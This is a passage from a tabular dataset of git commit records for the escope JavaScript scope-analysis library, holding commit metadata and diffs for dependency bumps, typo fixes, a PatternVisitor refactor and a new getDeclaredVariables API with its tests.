""gulp-mocha"": ""^2.2.0""<c><\n>+    ""jsdoc"": ""^3.4.0""<c><\n>","-        'no-multi-spaces': false<c><\n>-    settings: {<\n>-        ""ecmascript"": 6<c><\n>-        ""jsx"": false<\n>-        'node': true<\n>-    .pipe(babel)<\n>-    ""es6-map"": ""^0.1.2""<c><\n>-    ""babel"": ""^4.7.12""<c><\n>-    ""browserify"": ""^12.0.1""<c><\n>-    ""chai"": ""^3.4.0""<c><\n>-    ""esprima"": ""^2.7.0""<c><\n>-    ""gulp-babel"": ""^4.0.0""<c><\n>-    ""gulp-eslint"": ""^1.0.0""<c><\n>-    ""gulp-espower"": ""^1.0.1""<c><\n>-    ""gulp-git"": ""^1.6.0""<c><\n>-    ""gulp-mocha"": ""^2.1.3""<c><\n>-    ""jsdoc"": ""^3.3.3""<c><\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Mon,9,2,11 Jan 2016,Merge pull request #95 from eventualbuddha/remove-unused-dependencies Remove acorn and minimist which seem to be unused.,0,0,0,0,0,,,F
17,56,56,569,4,26,Brian Donovan,269,56,201,10,User,1,4177,Mon,8,49,11 Jan 2016,Remove acorn and minimist which seem to be unused.,0,0,1,2,51,,"-    ""acorn"": ""^2.5.2""<c><\n>-    ""minimist"": ""^1.2.0""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,21,52,21 Nov 2015,Bumps package version,0,0,1,2,46,"+  ""version"": ""3.3.0""<c><\n>","-  ""version"": ""3.2.1""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,21,51,21 Nov 2015,Merge pull request #89 from estools/spread Extract PatternVisitor to easily patch it,0,0,0,0,0,,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,20,16,20 Nov 2015,Extract PatternVisitor to easily patch it This allow external users to extend escope with SpreadProperty support.,0,1,1,205,8288,"+/*<\n>+  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+import { Syntax } from 'estraverse';<\n>+import esrecurse from 'esrecurse';<\n>+function getLast(xs) {<\n>+    return xs[xs.length - 1] || null;<\n>+export default class PatternVisitor extends esrecurse.Visitor {<\n>+    static isPattern(node) {<\n>+        var nodeType = node.type;<\n>+        return (<\n>+            nodeType === Syntax.Identifier ||<\n>+            nodeType === Syntax.ObjectPattern ||<\n>+            nodeType === Syntax.ArrayPattern ||<\n>+            nodeType === Syntax.SpreadElement ||<\n>+            nodeType === Syntax.RestElement ||<\n>+            nodeType === Syntax.AssignmentPattern<\n>+        );<\n>+    }<\n>+    constructor(rootPattern<c> callback) {<\n>+        super();<\n>+        this.rootPattern = rootPattern;<\n>+        this.callback = callback;<\n>+        this.assignments = [];<\n>+        this.rightHandNodes = [];<\n>+        this.restElements = [];<\n>+    }<\n>+    Identifier(pattern) {<\n>+        const lastRestElement = getLast(this.restElements);<\n>+        this.callback(pattern<c> {<\n>+            topLevel: pattern === this.rootPattern<c><\n>+            rest: lastRestElement != null && lastRestElement.argument === pattern<c><\n>+            assignments: this.assignments<\n>+        });<\n>+    }<\n>+    Property(property) {<\n>+        // Computed property's key is a right hand node.<\n>+        if (property.computed) {<\n>+            this.rightHandNodes.push(property.key);<\n>+        }<\n>+        // If it's shorthand<c> its key is same as its value.<\n>+        // If it's shorthand and has its default value<c> its key is same as its value.left (the value is AssignmentPattern).<\n>+        // If it's not shorthand<c> the name of new variable is its value's.<\n>+        this.visit(property.value);<\n>+    }<\n>+    ArrayPattern(pattern) {<\n>+        var i<c> iz<c> element;<\n>+        for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>+            element = pattern.elements[i];<\n>+            this.visit(element);<\n>+        }<\n>+    }<\n>+    AssignmentPattern(pattern) {<\n>+        this.assignments.push(pattern);<\n>+        this.visit(pattern.left);<\n>+        this.rightHandNodes.push(pattern.right);<\n>+        this.assignments.pop();<\n>+    }<\n>+    RestElement(pattern) {<\n>+        this.restElements.push(pattern);<\n>+        this.visit(pattern.argument);<\n>+        this.restElements.pop();<\n>+    }<\n>+    MemberExpression(node) {<\n>+        // Computed property's key is a right hand node.<\n>+        if (node.computed) {<\n>+            this.rightHandNodes.push(node.property);<\n>+        }<\n>+        // the object is only read<c> write to its property.<\n>+        this.rightHandNodes.push(node.object);<\n>+    }<\n>+    //<\n>+    // ForInStatement.left and AssignmentExpression.left are LeftHandSideExpression.<\n>+    // By spec<c> LeftHandSideExpression is Pattern or MemberExpression.<\n>+    //   (see also: https://github.com/estree/estree/pull/20#issuecomment-74584758)<\n>+    // But espree 2.0 and esprima 2.0 parse to ArrayExpression<c> ObjectExpression<c> etc...<\n>+    //<\n>+    SpreadElement(node) {<\n>+        this.visit(node.argument);<\n>+    }<\n>+    ArrayExpression(node) {<\n>+        node.elements.forEach(this.visit<c> this);<\n>+    }<\n>+    AssignmentExpression(node) {<\n>+        this.assignments.push(node);<\n>+        this.visit(node.left);<\n>+        this.rightHandNodes.push(node.right);<\n>+        this.assignments.pop();<\n>+    }<\n>+    CallExpression(node) {<\n>+        // arguments are right hand nodes.<\n>+        node.arguments.forEach(a => { this.rightHandNodes.push(a); });<\n>+        this.visit(node.callee);<\n>+    }<\n>+/* vim: set sw=4 ts=4 et tw=80 : */<\n>+import PatternVisitor from './pattern-visitor';<\n>+        if (PatternVisitor.isPattern(node.left)) {<\n>+        if (PatternVisitor.isPattern(node.argument)) {<\n>",-class PatternVisitor extends esrecurse.Visitor {<\n>-    constructor(rootPattern<c> callback) {<\n>-        super();<\n>-        this.rootPattern = rootPattern;<\n>-        this.callback = callback;<\n>-        this.assignments = [];<\n>-        this.rightHandNodes = [];<\n>-        this.restElements = [];<\n>-    }<\n>-    Identifier(pattern) {<\n>-        const lastRestElement = getLast(this.restElements);<\n>-        this.callback(pattern<c> {<\n>-            topLevel: pattern === this.rootPattern<c><\n>-            rest: lastRestElement != null && lastRestElement.argument === pattern<c><\n>-            assignments: this.assignments<\n>-        });<\n>-    }<\n>-    Property(property) {<\n>-        // Computed property's key is a right hand node.<\n>-        if (property.computed) {<\n>-            this.rightHandNodes.push(property.key);<\n>-        }<\n>-        // If it's shorthand<c> its key is same as its value.<\n>-        // If it's shorthand and has its default value<c> its key is same as its value.left (the value is AssignmentPattern).<\n>-        // If it's not shorthand<c> the name of new variable is its value's.<\n>-        this.visit(property.value);<\n>-    }<\n>-    ArrayPattern(pattern) {<\n>-        var i<c> iz<c> element;<\n>-        for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>-            element = pattern.elements[i];<\n>-            this.visit(element);<\n>-        }<\n>-    }<\n>-    AssignmentPattern(pattern) {<\n>-        this.assignments.push(pattern);<\n>-        this.visit(pattern.left);<\n>-        this.rightHandNodes.push(pattern.right);<\n>-        this.assignments.pop();<\n>-    }<\n>-    RestElement(pattern) {<\n>-        this.restElements.push(pattern);<\n>-        this.visit(pattern.argument);<\n>-        this.restElements.pop();<\n>-    }<\n>-    MemberExpression(node) {<\n>-        // Computed property's key is a right hand node.<\n>-        if (node.computed) {<\n>-            this.rightHandNodes.push(node.property);<\n>-        }<\n>-        // the object is only read<c> write to its property.<\n>-        this.rightHandNodes.push(node.object);<\n>-    }<\n>-    //<\n>-    // ForInStatement.left and AssignmentExpression.left are LeftHandSideExpression.<\n>-    // By spec<c> LeftHandSideExpression is Pattern or MemberExpression.<\n>-    //   (see also: https://github.com/estree/estree/pull/20#issuecomment-74584758)<\n>-    // But espree 2.0 and esprima 2.0 parse to ArrayExpression<c> ObjectExpression<c> etc...<\n>-    //<\n>-    SpreadElement(node) {<\n>-        this.visit(node.argument);<\n>-    }<\n>-    ArrayExpression(node) {<\n>-        node.elements.forEach(this.visit<c> this);<\n>-    }<\n>-    AssignmentExpression(node) {<\n>-        this.assignments.push(node);<\n>-        this.visit(node.left);<\n>-        this.rightHandNodes.push(node.right);<\n>-        this.assignments.pop();<\n>-    }<\n>-    CallExpression(node) {<\n>-        // arguments are right hand nodes.<\n>-        node.arguments.forEach(a => { this.rightHandNodes.push(a); });<\n>-        this.visit(node.callee);<\n>-    }<\n>-function getLast(xs) {<\n>-    return xs[xs.length - 1] || null;<\n>-function isPattern(node) {<\n>-    var nodeType = node.type;<\n>-    return (<\n>-        nodeType === Syntax.Identifier ||<\n>-        nodeType === Syntax.ObjectPattern ||<\n>-        nodeType === Syntax.ArrayPattern ||<\n>-        nodeType === Syntax.SpreadElement ||<\n>-        nodeType === Syntax.RestElement ||<\n>-        nodeType === Syntax.AssignmentPattern<\n>-    );<\n>-        if (isPattern(node.left)) {<\n>-        if (isPattern(node.argument)) {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,2,2,20 Nov 2015,Bumps package version,0,0,1,2,46,"+  ""version"": ""3.2.1""<c><\n>","-  ""version"": ""3.2.0""<c><\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Thu,7,3,5 Nov 2015,Merge pull request #87 from TrySound/bump-deps Bump deps,0,0,0,0,0,,,F
17,56,56,569,4,26,Bogdan Chadkin,107,9,442,47,User,1,2126,Thu,15,4,5 Nov 2015,Bump dependencies,0,0,1,48,1387,"+    ""es6-map"": ""^0.1.2""<c><\n>+    ""es6-weak-map"": ""^2.0.1""<c><\n>+    ""estraverse"": ""^4.1.1""<\n>+    ""acorn"": ""^2.5.2""<c><\n>+    ""browserify"": ""^12.0.1""<c><\n>+    ""chai"": ""^3.4.0""<c><\n>+    ""coffee-script"": ""^1.10.0""<c><\n>+    ""espree"": ""^2.2.5""<c><\n>+    ""esprima"": ""^2.7.0""<c><\n>+    ""gulp"": ""^3.9.0""<c><\n>+    ""gulp-bump"": ""^1.0.0""<c><\n>+    ""gulp-coffee"": ""^2.3.1""<c><\n>+    ""gulp-eslint"": ""^1.0.0""<c><\n>+    ""gulp-espower"": ""^1.0.1""<c><\n>+    ""gulp-filter"": ""^3.0.1""<c><\n>+    ""gulp-git"": ""^1.6.0""<c><\n>+    ""gulp-mocha"": ""^2.1.3""<c><\n>+    ""gulp-plumber"": ""^1.0.1""<c><\n>+    ""gulp-sourcemaps"": ""^1.6.0""<c><\n>+    ""gulp-tag-version"": ""^1.3.0""<c><\n>+    ""jsdoc"": ""^3.3.3""<c><\n>+    ""lazypipe"": ""^1.0.1""<c><\n>+    ""minimist"": ""^1.2.0""<c><\n>+    ""vinyl-source-stream"": ""^1.1.0""<\n>","-    ""es6-map"": ""^0.1.1""<c><\n>-    ""es6-weak-map"": ""^0.1.2""<c><\n>-    ""estraverse"": ""^3.1.0""<\n>-    ""acorn"": ""^0.12.0""<c><\n>-    ""browserify"": ""^9.0.3""<c><\n>-    ""chai"": ""^2.1.1""<c><\n>-    ""coffee-script"": ""^1.9.1""<c><\n>-    ""espree"": ""^2.0.2""<c><\n>-    ""esprima"": ""^2.1.0""<c><\n>-    ""gulp"": ""~3.8.10""<c><\n>-    ""gulp-bump"": ""^0.3.0""<c><\n>-    ""gulp-coffee"": ""^2.2.0""<c><\n>-    ""gulp-eslint"": ""^0.6.0""<c><\n>-    ""gulp-espower"": ""^0.10.0""<c><\n>-    ""gulp-filter"": ""^2.0.0""<c><\n>-    ""gulp-git"": ""^1.0.1""<c><\n>-    ""gulp-mocha"": ""~2.0.0""<c><\n>-    ""gulp-plumber"": ""^1.0.0""<c><\n>-    ""gulp-sourcemaps"": ""^1.3.0""<c><\n>-    ""gulp-tag-version"": ""^1.2.1""<c><\n>-    ""jsdoc"": ""=3.3.0-alpha13""<c><\n>-    ""lazypipe"": ""^0.2.2""<c><\n>-    ""minimist"": ""^1.1.0""<c><\n>-    ""vinyl-source-stream"": ""^1.0.0""<\n>",F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Tue,8,47,27 Oct 2015,Merge pull request #85 from estools/travis update travis config,0,0,0,0,0,,,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Tue,8,40,27 Oct 2015,update travis config,0,0,1,17,234,"+sudo: false<\n>+  - ""0.10""<\n>+  - ""0.11""<\n>+  - ""0.12""<\n>+  - ""iojs-1""<\n>+  - ""iojs-2""<\n>+  - ""iojs-3""<\n>+  - ""4""<\n>+matrix:<\n>+  allow_failures:<\n>+    - node_js:<\n>+      - ""0.11""<\n>+      - ""iojs-1""<\n>+      - ""iojs-2""<\n>+      - ""iojs-3""<\n>",-  - 0.10<\n>-  - 0.11<\n>,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Tue,8,20,27 Oct 2015,Merge pull request #84 from eventualbuddha/patch-2 Improve the consistency of the source code.,0,0,0,0,0,,,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Tue,8,19,27 Oct 2015,Merge pull request #83 from eventualbuddha/patch-1 Fix typo in comment.,0,0,0,0,0,,,F
17,56,56,569,4,26,Brian Donovan,269,56,201,10,User,1,4177,Tue,8,12,27 Oct 2015,Improve the consistency of the source code. Consistently use constants for node types and single quotes for strings.,0,0,1,6,344,+        if (block.type === Syntax.Program) {<\n>+            if (stmt.type !== Syntax.DirectiveStatement) {<\n>+        (def.type === Variable.Variable && def.parent.kind !== 'var')<\n>,"-        if (block.type === 'Program') {<\n>-            if (stmt.type !== 'DirectiveStatement') {<\n>-        (def.type === Variable.Variable && def.parent.kind !== ""var"")<\n>",F
17,56,56,569,4,26,Brian Donovan,269,56,201,10,User,1,4177,Tue,8,2,27 Oct 2015,Fix typo in comment.,0,0,1,2,98,+    // Returns appropriate scope for this node.<\n>,-    // Returns appropliate scope for this node.<\n>,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Sat,19,57,24 Oct 2015,Merge pull request #82 from kumavis/patch-1 fix typo,0,0,0,0,0,,,F
17,56,56,569,4,26,kumavis <kumavis@users.noreply.github.com>,-1,-1,-1,-1,-1,-1,-1,Sat,18,44,24 Oct 2015,fix typo,0,0,1,2,103,+         * bindings in this or its parent scopes.<\n>,-         * bindings in this or its prarent scopes.<\n>,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Wed,11,6,23 Sep 2015,Merge pull request #80 from robcolburn/patch-1 Fenced code block in README,0,0,0,0,0,,,F
17,56,56,569,4,26,Rob Colburn,79,33,13,5,User,0,3329,Wed,11,1,23 Sep 2015,Fenced code block in README Makes README a little prettier in GitHub & npm,0,0,1,45,1481,+```js<\n>+var escope = require('escope');<\n>+var esprima = require('esprima');<\n>+var estraverse = require('estraverse');<\n>+var ast = esprima.parse(code);<\n>+var scopeManager = escope.analyze(ast);<\n>+var currentScope = scopeManager.acquire(ast);   // global scope<\n>+estraverse.traverse(ast<c> {<\n>+    enter: function(node<c> parent) {<\n>+        // do stuff<\n>+        <\n>+        if (/Function/.test(node.type)) {<\n>+            currentScope = scopeManager.acquire(node);  // get current function scope<\n>+    }<c><\n>+    leave: function(node<c> parent) {<\n>+        if (/Function/.test(node.type)) {<\n>+            currentScope = currentScope.upper;  // set to parent scope<\n>+        }<\n>+        <\n>+        // do stuff<\n>+    }<\n>+```<\n>,-    var escope = require('escope');<\n>-    var esprima = require('esprima');<\n>-    var estraverse = require('estraverse');<\n>-    <\n>-    var ast = esprima.parse(code);<\n>-    var scopeManager = escope.analyze(ast);<\n>-    <\n>-    var currentScope = scopeManager.acquire(ast);   // global scope<\n>-    estraverse.traverse(ast<c> {<\n>-        enter: function(node<c> parent) {<\n>-            // do stuff<\n>-            <\n>-            if (/Function/.test(node.type)) {<\n>-                currentScope = scopeManager.acquire(node);  // get current function scope<\n>-            }<\n>-        }<c><\n>-        leave: function(node<c> parent) {<\n>-            if (/Function/.test(node.type)) {<\n>-                currentScope = currentScope.upper;  // set to parent scope<\n>-            }<\n>-            <\n>-            // do stuff<\n>-    });<\n>,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Sun,8,1,20 Sep 2015,Merge pull request #79 from mysticatea/scope-manager/get-declared-variables/wrong-if-dupe Fix: duplicate declared variables.,0,0,0,0,0,,,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Sun,16,56,20 Sep 2015,Fix: duplicate declared variables.,0,0,2,11,346,"+        if (variables.indexOf(variable) === -1) {<\n>+            variables.push(variable);<\n>+        }<\n>+    it 'should not get duplicate even if it\'s declared twice'<c> -><\n>+        ast = espree """"""<\n>+        var a = 0<c> a = 1;<\n>+        """"""<\n>+        verify ast<c> 'VariableDeclaration'<c> [<\n>+            ['a']<\n>+        ]<\n>",-        variables.push(variable);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sat,2,20,5 Sep 2015,Merge pull request #78 from mysticatea/fixes-76 Fixes visiting logic for ObjectPattern/ObjectExpression,0,0,0,0,0,,,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Sat,17,9,5 Sep 2015,Fixes visiting logic for ObjectPattern/ObjectExpression (fixes #76),0,0,1,29,1442,+    Property(property) {<\n>+        // Computed property's key is a right hand node.<\n>+        if (property.computed) {<\n>+            this.rightHandNodes.push(property.key);<\n>+        // If it's shorthand<c> its key is same as its value.<\n>+        // If it's shorthand and has its default value<c> its key is same as its value.left (the value is AssignmentPattern).<\n>+        // If it's not shorthand<c> the name of new variable is its value's.<\n>+        this.visit(property.value);<\n>,-    ObjectPattern(pattern) {<\n>-        var i<c> iz<c> property;<\n>-        for (i = 0<c> iz = pattern.properties.length; i < iz; ++i) {<\n>-            property = pattern.properties[i];<\n>-            // Computed property's key is a right hand node.<\n>-            if (property.computed) {<\n>-                this.rightHandNodes.push(property.key);<\n>-            }<\n>-            // If it's shorthand<c> its key is same as its value.<\n>-            // If it's shorthand and has its default value<c> its key is same as its value.left (the value is AssignmentPattern).<\n>-            // If it's not shorthand<c> the name of new variable is its value's.<\n>-            this.visit(property.value);<\n>-    ObjectExpression(node) {<\n>-        node.properties.forEach(property => {<\n>-            // Computed property's key is a right hand node.<\n>-            if (property.computed) {<\n>-                this.rightHandNodes.push(property.key);<\n>-            }<\n>-            this.visit(property.value);<\n>-        });<\n>-    }<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,17,28,13 Jul 2015,Bumps package version,0,0,1,2,46,"+  ""version"": ""3.2.0""<c><\n>","-  ""version"": ""3.1.0""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,17,27,13 Jul 2015,Add CAUTION to getDeclaredVariables API This API may be changed.,0,0,1,1,107,+     * CAUTION: This API is experimental. See https://github.com/estools/escope/pull/69 for more details.<\n>,,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Fri,0,49,3 Jul 2015,Merge pull request #71 from mysticatea/fix-wrong-strict-flag Fix the strict flag of the method initializer shorthands (fixes #70),0,0,0,0,0,,,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Thu,11,11,2 Jul 2015,Fix the strict flag of the method initializer shorthands (fixes #70),0,0,2,4,240,+        isMethodDefinition = node.type === Syntax.MethodDefinition;<\n>+        expect(scope.isStrict).to.be.false<\n>,-        isMethodDefinition = node.type === Syntax.MethodDefinition || node.method;<\n>-        expect(scope.isStrict).to.be.true<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,17,44,21 Jun 2015,Merge pull request #69 from mysticatea/get-declared-variables Feature Request: getDeclaredVariables(node): Variables[],0,0,0,0,0,,,F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Sat,7,35,20 Jun 2015,Add `ScopeManager.prototype.getDeclaredVariables(node)`,0,1,2,222,8425,"+        this.__declaredVariables = new WeakMap();<\n>+    /**<\n>+     * Get variables that are declared by the node.<\n>+     *<\n>+     * ""are declared by the node"" means the node is same as `Variable.defs[].node` or `Variable.defs[].parent`.<\n>+     * If the node declares nothing<c> this method returns an empty array.<\n>+     *<\n>+     * @param {Esprima.Node} node - a node to get.<\n>+     * @returns {Variable[]} variables that declared by the node.<\n>+     */<\n>+    getDeclaredVariables(node) {<\n>+        return this.__declaredVariables.get(node) || [];<\n>+    }<\n>+        this.__declaredVariables = scopeManager.__declaredVariables;<\n>+    __addDeclaredVariablesOfNode(variable<c> node) {<\n>+        if (node == null) {<\n>+            return;<\n>+        }<\n>+        var variables = this.__declaredVariables.get(node);<\n>+        if (variables == null) {<\n>+            variables = [];<\n>+            this.__declaredVariables.set(node<c> variables);<\n>+        }<\n>+        variables.push(variable);<\n>+    }<\n>+            if (def.type !== Variable.TDZ) {<\n>+                this.__addDeclaredVariablesOfNode(variable<c> def.node);<\n>+                this.__addDeclaredVariablesOfNode(variable<c> def.parent);<\n>+            }<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Toru Nagashima<\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+esrecurse = require 'esrecurse'<\n>+espree = require '../third_party/espree'<\n>+escope = require '..'<\n>+describe 'ScopeManager.prototype.getDeclaredVariables'<c> -><\n>+    verify = (ast<c> type<c> expectedNamesList) -><\n>+        scopeManager = escope.analyze ast<c><\n>+            ecmaVersion: 6<\n>+            sourceType: 'module'<\n>+        visitor = {}<\n>+        visitor[type] = (node) -><\n>+            expected = expectedNamesList.shift()<\n>+            actual = scopeManager.getDeclaredVariables node<\n>+            expect(actual).to.have.length expected.length<\n>+            if actual.length > 0<\n>+                for i in [0..actual.length-1]<\n>+                    expect(actual[i].name).to.be.equal expected[i]<\n>+            @visitChildren node<\n>+        esrecurse.visit ast<c> visitor<\n>+        expect(expectedNamesList).to.have.length 0<\n>+    it 'should get variables that declared on `VariableDeclaration`'<c> -><\n>+        ast = espree """"""<\n>+        var {a<c> x: [b]<c> y: {c = 0}} = foo;<\n>+        let {d<c> x: [e]<c> y: {f = 0}} = foo;<\n>+        const {g<c> x: [h]<c> y: {i = 0}} = foo<c> {j<c> k = function() { let l; }} = bar;<\n>+        """"""<\n>+        verify ast<c> 'VariableDeclaration'<c> [<\n>+            ['a'<c> 'b'<c> 'c']<\n>+            ['d'<c> 'e'<c> 'f']<\n>+            ['g'<c> 'h'<c> 'i'<c> 'j'<c> 'k']<\n>+            ['l']<\n>+        ]<\n>+    it 'should get variables that declared on `VariableDeclaration` in for-in/of'<c> -><\n>+        ast = espree """"""<\n>+        for (var {a<c> x: [b]<c> y: {c = 0}} in foo) {<\n>+            let g;<\n>+        }<\n>+        for (let {d<c> x: [e]<c> y: {f = 0}} of foo) {<\n>+            let h;<\n>+        }<\n>+        """"""<\n>+        verify ast<c> 'VariableDeclaration'<c> [<\n>+            ['a'<c> 'b'<c> 'c']<\n>+            ['g']<\n>+            ['d'<c> 'e'<c> 'f']<\n>+            ['h']<\n>+        ]<\n>+    it 'should get variables that declared on `VariableDeclarator`'<c> -><\n>+        ast = espree """"""<\n>+        var {a<c> x: [b]<c> y: {c = 0}} = foo;<\n>+        let {d<c> x: [e]<c> y: {f = 0}} = foo;<\n>+        const {g<c> x: [h]<c> y: {i = 0}} = foo<c> {j<c> k = function() { let l; }} = bar;<\n>+        """"""<\n>+        verify ast<c> 'VariableDeclarator'<c> [<\n>+            ['a'<c> 'b'<c> 'c']<\n>+            ['d'<c> 'e'<c> 'f']<\n>+            ['g'<c> 'h'<c> 'i']<\n>+            ['j'<c> 'k']<\n>+            ['l']<\n>+        ]<\n>+    it 'should get variables that declared on `FunctionDeclaration`'<c> -><\n>+        ast = espree """"""<\n>+        function foo({a<c> x: [b]<c> y: {c = 0}}<c> [d<c> e]) {<\n>+            let z;<\n>+        }<\n>+        function bar({f<c> x: [g]<c> y: {h = 0}}<c> [i<c> j = function(q) { let w; }]) {<\n>+            let z;<\n>+        }<\n>+        """"""<\n>+        verify ast<c> 'FunctionDeclaration'<c> [<\n>+            ['foo'<c> 'a'<c> 'b'<c> 'c'<c> 'd'<c> 'e']<\n>+            ['bar'<c> 'f'<c> 'g'<c> 'h'<c> 'i'<c> 'j']<\n>+        ]<\n>+    it 'should get variables that declared on `FunctionExpression`'<c> -><\n>+        ast = espree """"""<\n>+        (function foo({a<c> x: [b]<c> y: {c = 0}}<c> [d<c> e]) {<\n>+            let z;<\n>+        });<\n>+        (function bar({f<c> x: [g]<c> y: {h = 0}}<c> [i<c> j = function(q) { let w; }]) {<\n>+            let z;<\n>+        });<\n>+        """"""<\n>+        verify ast<c> 'FunctionExpression'<c> [<\n>+            ['foo'<c> 'a'<c> 'b'<c> 'c'<c> 'd'<c> 'e']<\n>+            ['bar'<c> 'f'<c> 'g'<c> 'h'<c> 'i'<c> 'j']<\n>+            ['q']<\n>+        ]<\n>+    it 'should get variables that declared on `ArrowFunctionExpression`'<c> -><\n>+        ast = espree """"""<\n>+        (({a<c> x: [b]<c> y: {c = 0}}<c> [d<c> e]) => {<\n>+            let z;<\n>+        });<\n>+        (({f<c> x: [g]<c> y: {h = 0}}<c> [i<c> j]) => {<\n>+            let z;<\n>+        });<\n>+        """"""<\n>+        verify ast<c> 'ArrowFunctionExpression'<c> [<\n>+            ['a'<c> 'b'<c> 'c'<c> 'd'<c> 'e']<\n>+            ['f'<c> 'g'<c> 'h'<c> 'i'<c> 'j']<\n>+        ]<\n>+    it 'should get variables that declared on `ClassDeclaration`'<c> -><\n>+        ast = espree """"""<\n>+        class A { foo(x) { let y; } }<\n>+        class B { foo(x) { let y; } }<\n>+        """"""<\n>+        verify ast<c> 'ClassDeclaration'<c> [<\n>+            ['A'<c> 'A'] # outer scope's and inner scope's.<\n>+            ['B'<c> 'B']<\n>+        ]<\n>+    it 'should get variables that declared on `ClassExpression`'<c> -><\n>+        ast = espree """"""<\n>+        (class A { foo(x) { let y; } });<\n>+        (class B { foo(x) { let y; } });<\n>+        """"""<\n>+        verify ast<c> 'ClassExpression'<c> [<\n>+            ['A']<\n>+            ['B']<\n>+        ]<\n>+    it 'should get variables that declared on `CatchClause`'<c> -><\n>+        ast = espree """"""<\n>+        try {} catch ({a<c> b}) {<\n>+            let x;<\n>+            try {} catch ({c<c> d}) {<\n>+                let y;<\n>+            }<\n>+        }<\n>+        """"""<\n>+        verify ast<c> 'CatchClause'<c> [<\n>+            ['a'<c> 'b']<\n>+            ['c'<c> 'd']<\n>+        ]<\n>+    it 'should get variables that declared on `ImportDeclaration`'<c> -><\n>+        ast = espree """"""<\n>+        import ""aaa"";<\n>+        import * as a from ""bbb"";<\n>+        import b<c> {c<c> x as d} from ""ccc"";<\n>+        """"""<c> sourceType: 